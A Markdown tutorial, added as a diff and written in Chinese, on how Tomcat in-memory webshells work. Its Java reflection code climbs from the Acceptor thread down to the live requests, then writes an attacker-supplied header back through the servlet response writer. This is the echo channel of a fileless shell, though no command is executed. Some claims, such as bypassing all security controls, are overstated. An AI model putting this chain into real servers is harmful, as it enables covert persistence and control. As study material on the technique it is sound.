@@ -1,0 +1,502 @@
+# 📘 **Tomcat 内存马原理**
+
+------
+
+## 1️⃣ Tomcat 内存马
+
+Tomcat 内存马属于：
+
+```mathematica
+原生 Web 容器层（Web Container Level）内存马
+```
+
+**它不依赖：**
+
+- Spring
+- Servlet
+- Filter
+- Controller
+
+它直接把“入口”绑在 Tomcat 的底层线程上。
+
+**因此：**
+
+- 它比 Spring 型内存马更底层
+- 它捕获所有请求
+- 它不需要 URL 映射
+- 它绕过所有安全控制
+
+
+
+------
+
+## 2️⃣ Tomcat 的 3 类核心线程
+
+------
+
+### 1.  Acceptor 线程
+
+> 负责接收客户端 TCP 连接；Tomcat 的 Accept 线程名：
+
+```perl
+http-nio-8080-Acceptor
+```
+
+测试：
+
+```java
+@GetMapping
+public List<String> result() throws Exception {
+    Method getThreads = Thread.class.getDeclaredMethod("getThreads");
+    getThreads.setAccessible(true);
+    List list = new ArrayList();
+    Thread[] threads = (Thread[]) getThreads.invoke(null);
+
+    for (Thread t : threads) {
+        if (t.getName().contains("http") && t.getName().contains("Acceptor")) {
+            Field f = t.getClass().getDeclaredField("target");
+            f.setAccessible(true);
+            Object acceptor = f.get(t);
+            list.add("**********  " + acceptor.getClass().toString() + " ***************");
+        }
+        list.add(t.getName());
+    }
+
+    return list;
+}
+```
+
+![image-20251128103937013](./assets/image-20251128103937013.png)
+
+------
+
+### 2 **Poller 线程**
+
+> 负责将 socket 注册到 Poller（NIO）
+
+​	线程名：
+
+```perl
+http-nio-8080-Poller
+```
+
+------
+
+### 3 Executor 执行线程（处理请求）
+
+真正处理请求的工作线程
+
+```perl
+http-nio-8080-exec-1
+http-nio-8080-exec-2
+...
+```
+
+
+
+
+
+------
+
+## 3️⃣ 内存马执行过程：
+
+> 如下代码解释运行过程：
+
+```java
+@GetMapping
+public List<String> result() throws Exception {
+    Method getThreads = Thread.class.getDeclaredMethod("getThreads");
+    getThreads.setAccessible(true);
+    List list = new ArrayList();
+    Thread[] threads = (Thread[]) getThreads.invoke(null);
+
+    for (Thread t : threads) {
+        if (t.getName().contains("http") && t.getName().contains("Acceptor")) {
+            Field f = t.getClass().getDeclaredField("target");
+            f.setAccessible(true);
+            Object acceptor = f.get(t);
+            // class org.apache.tomcat.util.net.Acceptor
+            list.add(">>> Acceptor = " + acceptor.getClass().toString());
+
+
+            f = acceptor.getClass().getDeclaredField("endpoint");
+
+            f.setAccessible(true);
+            Object endpoint = f.get(acceptor);
+            // class org.apache.tomcat.util.net.NioEndpoint
+            list.add(">>> endpoint = " + endpoint.getClass().toString());
+
+            try {
+                f = endpoint.getClass().getDeclaredField("handler");
+
+            } catch (NoSuchFieldException e) {
+                try {
+                    f = endpoint.getClass().getSuperclass().getDeclaredField("handler");
+                } catch (NoSuchFieldException var12) {
+                    f = endpoint.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
+                }
+            }
+
+            f.setAccessible(true);
+            Object handler = f.get(endpoint);
+            // class org.apache.coyote.AbstractProtocol$ConnectionHandler
+            list.add(">>> handler = " + handler.getClass());
+
+            f = handler.getClass().getDeclaredField("global");
+            f.setAccessible(true);
+            Object global = f.get(handler);
+            // class org.apache.coyote.RequestGroupInfo
+            list.add(">>> global = " + global.getClass());
+
+        }
+        list.add(t.getName());
+    }
+
+    return list;
+}
+```
+
+![image-20251128151956399](./assets/image-20251128151956399.png)
+
+
+
+------
+
+### 1. 内存马枚举 Thread
+
+ Tomcat 的入口线程本质上在 JVM 中常驻：
+
+```java
+Method getThreads = Thread.class.getDeclaredMethod("getThreads");
+getThreads.setAccessible(true);
+Thread[] threads = (Thread[]) getThreads.invoke(null);
+```
+
+当攻击者可以遍历所有线程时：
+
+- 可以找到所有 Acceptor
+- 可以找到所有 Poller
+- 可以找到所有执行线程（exec-x）
+
+这是“内存马中最底层的入口点”。
+
+
+
+------
+
+### 2. 判断线程名 contains("http") && contains("Acceptor")
+
+> 攻击者要筛选出，只负责接收 HTTP 请求的线程
+
+Tomcat Thread 的命名规则：
+
+| 类型     | 线程名示例             |
+| -------- | ---------------------- |
+| Acceptor | http-nio-8080-Acceptor |
+| Poller   | http-nio-8080-Poller   |
+| Worker   | http-nio-8080-exec-7   |
+
+所以：找到 **HTTP 连接入口线程**。
+
+```java
+if (t.getName().contains("http") && t.getName().contains("Acceptor"))
+```
+
+
+
+------
+
+### 3. Acceptor.target
+
+它作为 Runnable 存在于 Thread 中, 当当前线程为 `http-nio-8080-Acceptor`，那它将作为：
+
+```mathematica
+Thread.target → Acceptor
+```
+
+Acceptor 内部含有对真正“网络入口”的引用：
+
+```
+Acceptor.this.endpoint
+```
+
+因为 Acceptor 只是接收了 tcp 连接，它本身并不处理 HTTP 请求。它内部保存了
+
+```nginx
+endpoint → handler
+```
+
+结构如下:
+
+```scss
+Acceptor
+	└── endpoint (NioEndpoint)
+         └── handler (ConnectionHandler)
+                └── global (RequestGroupInfo)
+                      └── processors (正在处理的所有请求)
+```
+
+
+
+------
+
+### 4. endpoint / handler / global / processors 
+
+------
+
+#### `endpoint`（NioEndpoint）
+
+> NioEndpoint 是 Tomcat 的 NIO 通道层， 负责管理 Socket 连接、接收客户端请求、处理网络 IO 的底层模块，是连接 HTTP 协议处理器之前的“一层网络入口”。
+
+- **socket 读**
+- **socket 写**
+- **socket 注册到 Poller**
+
+它维护着一个 ConnectionHandler。
+
+------
+
+#### `handler`（ConnectionHandler）
+
+负责管理所有连接与请求的最核心类：
+
+```
+AbstractProtocol$ConnectionHandler
+```
+
+内部拥有一个“全局请求监控对象”：
+
+```csharp
+RequestGroupInfo global;
+```
+
+------
+
+#### `global` (RequestGroupInfo)
+
+这是一个 **“当前所有请求的容器”**
+
+它里面有：
+
+```java
+List<RequestInfo> processors;
+```
+
+------
+
+#### `processors`
+
+> 一个 List，里面是所有 Worker 正在处理的 Request
+
+通过它可以拿到：
+
+```scss
+req(CoyoteRequest) → getResponse()
+```
+
+这就是最终能拿到 Response 进行回显的关键。
+
+
+
+------
+
+###  5. Response.getWriter 回显
+
+> 先贴payload和代码
+
+```JAVA
+@GetMapping
+public List<String> result() throws Exception {
+    Method getThreads = Thread.class.getDeclaredMethod("getThreads");
+    getThreads.setAccessible(true);
+    List list = new ArrayList();
+    Thread[] threads = (Thread[]) getThreads.invoke(null);
+
+    for (Thread t : threads) {
+        if (t.getName().contains("http") && t.getName().contains("Acceptor")) {
+            Field f = t.getClass().getDeclaredField("target");
+            f.setAccessible(true);
+            Object acceptor = f.get(t);
+            // class org.apache.tomcat.util.net.Acceptor
+            list.add(">>> Acceptor = " + acceptor.getClass().toString());
+
+
+            f = acceptor.getClass().getDeclaredField("endpoint");
+
+            f.setAccessible(true);
+            Object endpoint = f.get(acceptor);
+            // class org.apache.tomcat.util.net.NioEndpoint
+            list.add(">>> endpoint = " + endpoint.getClass().toString());
+
+            try {
+                f = endpoint.getClass().getDeclaredField("handler");
+
+            } catch (NoSuchFieldException e) {
+                try {
+                    f = endpoint.getClass().getSuperclass().getDeclaredField("handler");
+                } catch (NoSuchFieldException var12) {
+                    f = endpoint.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
+                }
+            }
+
+            f.setAccessible(true);
+            Object handler = f.get(endpoint);
+            // class org.apache.coyote.AbstractProtocol$ConnectionHandler
+            list.add(">>> handler = " + handler.getClass());
+
+            f = handler.getClass().getDeclaredField("global");
+            f.setAccessible(true);
+            Object global = f.get(handler);
+            // class org.apache.coyote.RequestGroupInfo
+            list.add(">>> global = " + global.getClass());
+
+            f = global.getClass().getDeclaredField("processors");
+            f.setAccessible(true);
+            ArrayList processors = (ArrayList) f.get(global);
+            for (Object processor : processors) {
+                // processor → req(Request)
+                f = processor.getClass().getDeclaredField("req");
+                f.setAccessible(true);
+                Object request = f.get(processor);
+
+                // request → getHeader
+                String cmd = (String) request.getClass().getMethod("getHeader",String.class).invoke(request, 				 "X-Authorization");
+
+                if (cmd == null) continue;
+
+
+                // 8. 拿到 response
+                Object coyoteResponse = request.getClass().getMethod("getResponse").invoke(request);
+                list.add(">>> coyoteResponse = " + coyoteResponse.getClass().toString());
+
+                //
+                f = coyoteResponse.getClass().getDeclaredField("notes");
+                f.setAccessible(true);
+                Object[] notes = (Object[]) f.get(coyoteResponse);
+
+                // notes[1] 是 Catalina Response
+                Object response = notes[1];
+                Writer w = (Writer) response.getClass().getMethod("getWriter").invoke(response);
+
+                // 写回显
+                w.write("Command header = " + cmd);
+                w.flush();
+                w.close();
+            }
+
+        }
+        list.add(t.getName());
+    }
+
+    return list;
+}
+```
+
+![image-20251128164351428](./assets/image-20251128164351428.png)
+
+不过此时的Response 属于 **Coyote（协议层）**， `org.apache.coyote.Response` **不是** Servlet 层的 Response
+
+它没有：
+
+- `getWriter()`
+- `getOutputStream()`
+- Servlet API 中的所有方法
+
+当前拿到的是 **底层 Response**，它负责 HTTP 解析与传输，不负责写 Servlet 输出。
+
+#### 1. Tomcat中Response结构
+
+```scss
+HttpServletResponse (可控制)
+    ↑
+org.apache.catalina.connector.Response (Servlet 容器层)
+    ↑
+org.apache.catalina.connector.ResponseFacade (真正给应用暴露的)
+    ↑
+org.apache.coyote.Response (协议层)
+```
+
+当前处于最底层：
+
+​	`org.apache.coyote.Response`
+
+需要使用：
+
+​	`org.apache.catalina.connector.Response`
+
+或
+
+​	`ResponseFacade`
+
+这两个类才有：
+
+```java
+getWriter()
+getOutputStream()
+setHeader()
+setStatus()
+```
+
+#### 2. 解决办法：从 org.apache.coyote.Response 获取上层 Response
+
+```java
+// 从 Coyote Response 获取 Catalina Response
+Field notesField = coyoteResponse.getClass().getDeclaredField("notes");
+notesField.setAccessible(true);
+Object[] notes = (Object[]) notesField.get(coyoteResponse);
+
+// notes[1] 是 Catalina Response
+Object response = notes[1];
+```
+
+通常得到的就是：
+
+```
+org.apache.catalina.connector.Response
+```
+
+#### 3. Writer 回显
+
+拿到Writer
+
+```java
+Writer w = (Writer) response.getClass().getMethod("getWriter").invoke(response);
+
+// 写回显
+w.write("Command header = " + cmd);
+w.flush();
+w.close();
+```
+
+此时 **还在请求的生命周期中**
+ Tomcat 会自动 flush 输出内容
+ 浏览器就能收到恶意内存马的输出。
+
+它会覆盖你 Controller 中 return 的内容。
+
+
+
+------
+
+## 4️⃣ 总结：Tomcat 内存马的核心链路图
+
+```scss
+Thread ("http-nio-8080-Acceptor")
+   ↓
+target (Acceptor)
+   ↓
+endpoint (NioEndpoint)
+   ↓
+handler (ConnectionHandler)
+   ↓
+global (RequestGroupInfo)
+   ↓
+processors (List<RequestInfo>)
+   ↓
+req (CoyoteRequest)
+   ↓
+response (Response)
+   ↓
+writer.write()  ← 回显
+```
+
